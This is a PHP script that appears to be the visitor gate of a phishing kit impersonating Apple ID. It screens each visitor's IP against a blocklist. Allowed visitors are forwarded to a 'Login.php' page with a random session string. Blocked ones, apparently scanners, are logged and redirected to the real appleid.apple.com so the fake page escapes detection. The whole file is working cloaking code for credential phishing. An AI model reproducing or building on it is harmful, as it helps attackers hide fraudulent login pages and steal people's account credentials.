<?php
require_once("assets/includes/functions.php");
$ips = array(	$_SERVER['REMOTE_ADDR'], );
$hostby = gethostbyaddr("$v_ip");
$checklist = new IpBlockList( );
foreach ($ips as $ip ) {
	$result = $checklist->ipPass( $ip );
	if ( $result ) {
		$msg = "PASSED: ".$checklist->message();
		session_start();
        $_SESSION['page_a_visited'] = true;
		redirectTo("Login.php?secure=true&idsession=" . generateRandomString(70));
	}
	else {
		$msg = "FAILED: ".$checklist->message();
$msgs = "
<font color='red'>Denied Visitor (Blacklist) |  IP : ".$v_ip." - Date : ".$v_date." - Browser : ".$v_agent." - Host : ".$v_host." <br></font>";
$file=fopen("assets/logs/visitorlog.html","a");
fwrite($file, $msgs);
fclose($file);
        header("Location: https://www.google.ca/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwi_yey8kvzJAhWwj4MKHVp5ALcQFggcMAA&url=https%3A%2F%2Fappleid.apple.com%2F&usg=AFQjCNF7841Jq5PLrYJwYDN8RkcZjuNVww");
		die();
	}
}
?>